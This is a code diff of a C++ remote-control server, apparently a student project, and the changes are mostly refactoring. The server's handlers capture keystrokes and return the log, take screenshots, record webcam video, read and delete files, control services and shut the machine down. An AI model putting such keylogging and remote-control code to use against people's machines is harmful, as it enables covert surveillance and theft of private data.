@@ -7,7 +7,7 @@
 bool Server::keylog(Request& request, Response &response) {
     static KeyLogger keylog;
 
-    string subaction = request.getParam(kSubAction);
+    std::string subaction = request.getParam(kSubAction);
     response.putParam(kStatus, "Ok");
     
     if (subaction == "Start") {
@@ -17,9 +17,9 @@ bool Server::keylog(Request& request, Response &response) {
         cout << "Stopped keylogger\n";
         keylog.stopKeylogger();
 
-        ifstream fin = keylog.getLoggingStream();
-        string content; 
-        string buf;
+        std::ifstream fin = keylog.getLoggingStream();
+        std::string content; 
+        std::string buf;
         while (getline(fin, buf)) {
             content += buf + "\n"; 
         }
@@ -27,9 +27,8 @@ bool Server::keylog(Request& request, Response &response) {
     
         response.putParam(kBody, content);
 
-        // Gui file
-        fin = ifstream("tmt.txt", fstream::binary);
-        
+        // Gui file TODO DELETE
+        // fin = std::ifstream("tmt.txt", fstream::binary);
         response.putParam(kFilePrefix + "tmt.txt", "");
     }  
 
@@ -122,8 +121,8 @@ bool Server::handleApp(Request& request, Response& response){
 // ---Start---
 bool handleGetFile(Request& request, Response& response){
     File file;
-    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
-    string file_content = file.readFile(file_name);
+    std::string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
+    std::string file_content = file.readFile(file_name);
     response.putParam(kBody, file_content);
     return true;
     
@@ -131,7 +130,7 @@ bool handleGetFile(Request& request, Response& response){
 
 bool handleDeleteFile(Request& request, Response& response){
     File file;
-    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
+    std::string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
     file.deleteFile(file_name);
     response.putParam(kStatus, "Deleted File");
     return true;
@@ -139,14 +138,14 @@ bool handleDeleteFile(Request& request, Response& response){
 
 bool listRunningService(Request& request, Response& response){
     Service service;
-    string list_service = service.listRunningServices();
+    std::string list_service = service.listRunningServices();
     response.putParam(kBody, list_service);
     return true;
 }
 
 bool handleStartService(Request& request, Response& response){
     Service service;
-    string name_service = request.getParam(kSubAction);
+    std::string name_service = request.getParam(kSubAction);
     service.StartServiceByName(name_service);
     response.putParam(kStatus, "Started service");
     return true;
@@ -154,7 +153,7 @@ bool handleStartService(Request& request, Response& response){
 
 bool handleStopService(Request& request, Response& response){
     Service service;
-    string name_service = request.getParam(kSubAction);
+    std::string name_service = request.getParam(kSubAction);
     service.StopServiceByName(name_service);
     response.putParam(kStatus, "Stopped service");
     return true;
@@ -173,8 +172,6 @@ bool Server::processRequest(Request& request, Response &response) {
             return keylog(request, response);
         case ACTION_SHUTDOWN:
             return handleShutdownSystem(request, response);
-        case ACTION_RESTART:
-            return handleRestartSystem(request, response);
         case ACTION_APP:
             return handleApp(request, response);
         default:
@@ -221,7 +218,7 @@ extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width,
 
     if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
         return false;
-    if ((BmpFile = CreateFile(filename,
+    if ((BmpFile = CreateFileA(filename,
                               GENERIC_WRITE,
                               0, NULL,
                               CREATE_NEW, 
@@ -319,7 +316,7 @@ bool Server::screenshot(Request& request, Response &response){
 
 
 bool Server::getVideoByWebcam(Request& request, Response &response) {
-    std::string subaction = request.getParam(kSubAction);
+    /* std::string subaction = request.getParam(kSubAction);
     response.putParam(kStatus, "Ok");
     isRecording = false;
     if (subaction == "Start") {
@@ -390,12 +387,7 @@ bool Server::getVideoByWebcam(Request& request, Response &response) {
         std::cerr << "Error: Invalid subaction." << std::endl;
         response.putParam(kStatus, "Error: Invalid subaction");
         return false;
-    }
+    } */
 
     return true;
-}
-
-
-bool Server::processRequest(Request& request, Response &response){
-
 }
